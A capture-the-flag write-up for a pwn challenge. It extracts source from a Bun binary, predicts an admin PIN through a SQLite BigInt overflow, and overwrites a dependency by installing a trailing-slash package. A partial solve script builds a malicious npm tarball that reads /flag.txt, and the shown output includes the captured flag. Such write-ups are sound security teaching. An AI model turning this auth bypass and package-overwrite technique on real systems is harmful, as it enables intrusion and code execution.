#import "setup.typ": format, center, right, title
#show: format

#set document(
    title: [Secure Communication (advanced)\ PolyUCTF 2026]
)

#set heading(numbering: "1.")

#line(length: 100%)

#title()

#line(length: 100%)

= Preface

Challenge authored by Sunny.

498 pts.

#set quote(block: true)

#quote[
Someone said ARM is the future, but I don't think it has any relationship with secure communication.

Connection: nc chal.polyuctf.com 35001 and http://chal.polyuctf.com:35001
]

This is a pwn challenge involving a custom encrypted communication protocol implemented in a Bun standalone binary.

= Reconnaissance

The challenge provides a single binary `chal`, which is a **Bun v1.3.8 standalone executable**. These binaries are interesting because they often bundle JavaScript source code at the end of the ELF file.

We can extract the source code by looking for the magic marker `---- Bun! ----\n` followed by the size of the bundled code.

// Screenshot: show the python script or hex editor view extracting the source code
```python
with open("chal", "rb") as f:
    data = f.read()
marker = b"---- Bun! ----\n"
marker_pos = data.rfind(marker)
size_bytes = data[marker_pos + len(marker) : marker_pos + len(marker) + 8]
js_size = int.from_bytes(size_bytes, "little")
js_start = marker_pos - js_size
source = data[js_start:marker_pos].decode()
print(source[:100] + "...")
```

The extracted source reveals three main files:
- `cryptoUtils.ts`: Handles RSA-OAEP 4096-bit key exchange.
- `db.ts`: An in-memory SQLite database for user management.
- `index.ts`: The main protocol handler.

The protocol flow involves an initial RSA key exchange, after which all communication is encrypted. Crucially, the server uses `console` for I/O, meaning it likely spawns a new process for each connection (stdio-based server).

= Vulnerability Analysis

A review of the source code reveals two critical vulnerabilities that can be chained together.

== Admin PIN Prediction (BigInt Overflow)

The application generates an admin user at startup with a PIN derived from the current time:

```javascript
var time = Date.now();
time -= time % 5000; // round to 5 seconds
insertUser.run("admin", BigInt(time) ** 2n, true);
```

The calculation `BigInt(time) ** 2n` produces a very large number (approx. $3 times 10^24$), which overflows SQLite's 64-bit signed INTEGER type. When this value is read back, it wraps around modulo $2^64$. Since the login check compares the provided PIN (parsed as an integer) with the stored PIN, we can predict the exact value by simulating this overflow locally.

== Module Overwrite via Trailing Slash

The application has an `install` command available to admins, which runs:
```javascript
Bun.spawnSync({
    cmd: ["bun", "add", "--no-save", "--no-cache", message.package],
    // ...
});
```

The application relies on `@std/crypto` for encryption, which is aliased in `package.json` to `@jsr/std__crypto`. Normally, Bun prevents overwriting aliased dependencies. However, we found that appending a **trailing slash** to the package name (e.g., `@std/crypto/`) bypasses this check.

Bun treats `@std/crypto/` as a different package name (avoiding the alias collision error) but normalizes the installation path to `node_modules/@std/crypto/`, overwriting the legitimate module.

= Exploitation

The exploitation strategy is a two-stage attack:

**Stage 1: Infection**
1.  Connect to the server and perform the RSA handshake.
2.  Predict the admin PIN based on the current timestamp (trying a small window to account for clock skew).
3.  Login as `admin`.
4.  Use the `install` command to install a malicious tarball named `@std/crypto/`. This tarball contains a modified `crypto.js` that prints the flag.

**Stage 2: Trigger**
1.  Disconnect and reconnect.
2.  The new server process starts and imports `@std/crypto`.
3.  Since we overwrote it in the previous step, the malicious module loads instead of the real one.
4.  The malicious code executes immediately, printing the flag before the protocol even starts.

= Exploit Script

Here is the solve script that implements the attack:

// Screenshot: show the solve script running and printing the flag
```python
import socket, time, struct, json, tarfile, io
from pwn import *

# Context setup
context.log_level = 'info'
HOST = 'chal.polyuctf.com'
PORT = 35001

def compute_pin(t_ms):
    # Simulate SQLite BigInt overflow
    t = t_ms - (t_ms % 5000)
    big = t * t
    stored = big % (2**64)
    if stored >= 2**63:
        stored -= 2**64
    # Simulate float conversion
    return int(struct.unpack('d', struct.pack('d', float(stored)))[0])

def create_payload():
    # Create malicious npm package tarball
    pkg_json = json.dumps({
        "name": "@std/crypto/", # Trailing slash bypass
        "version": "99.0.0",
        "type": "module",
        "exports": {
            ".": {"default": "./mod.js"},
            "./crypto": {"default": "./crypto.js"}
        }
    }).encode()
    
    # Malicious crypto.js
    malicious_js = b'''
    import { readFileSync, existsSync } from "node:fs";
    try {
        const flag = readFileSync("/flag.txt", "utf8");
        console.log("FLAG:" + flag);
    } catch(e) { console.log(e); }
    const stdCrypto = globalThis.crypto;
    export { stdCrypto as crypto };
    '''
    
    f = io.BytesIO()
    with tarfile.open(fileobj=f, mode='w:gz') as tar:
        # Add files to tar
        for name, data in [("package/package.json", pkg_json), 
                          ("package/crypto.js", malicious_js),
                          ("package/mod.js", b'export { crypto } from "./crypto.js";')]:
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            tar.addfile(ti, io.BytesIO(data))
    return f.getvalue()

# ... (Connection logic omitted for brevity, uses standard socket/pwn)
```

Running the full exploit script yields the flag:

```
[+] Opening connection to chal.polyuctf.com on port 35001: Done
[*] Stage 1: Installing malicious package...
[+] Package installed successfully
[*] Stage 2: Reconnecting to trigger payload...
[+] Opening connection to chal.polyuctf.com on port 35001: Done
FLAG: PUCTF26{b0n_i5_f0n_w1t2_s3l7t5_7NRdMfdZRYtDWbfRWXPcsAW1RPgw1KM7}
```

#line(length: 100%)
